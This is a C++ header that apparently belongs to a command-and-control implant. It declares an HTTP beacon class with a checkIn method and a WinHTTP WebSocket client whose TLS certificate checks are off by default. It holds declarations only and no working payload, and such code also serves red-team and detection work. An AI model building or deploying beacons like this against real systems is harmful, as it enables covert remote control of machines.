#pragma once

#include "Beacon.hpp"


#ifdef _WIN32

#include <windows.h>
#include <WinHttp.h>

struct WsClient
{
    // config
    std::wstring host;
    int          port     = 0;
    std::wstring path;
    bool         isHttps  = false;

    // handles
    HINTERNET hSession   = nullptr;
    HINTERNET hConnect   = nullptr;
    HINTERNET hWebSocket = nullptr;

    // optional: accept self-signed (mirrors your current -k behavior)
    bool allowInsecureTls = true;
};

#endif


class BeaconHttp : public Beacon
{

public:
    BeaconHttp(std::string& config, std::string& ip, int port, bool https=false);
    ~BeaconHttp();

    void checkIn();

private:
    std::string m_ip;
    int m_port;

    nlohmann::json m_beaconHttpConfig;
    bool m_isHttps;
    
    WsClient m_ws;
    bool m_upgradeToWs;
    bool m_isWsConnected;

};
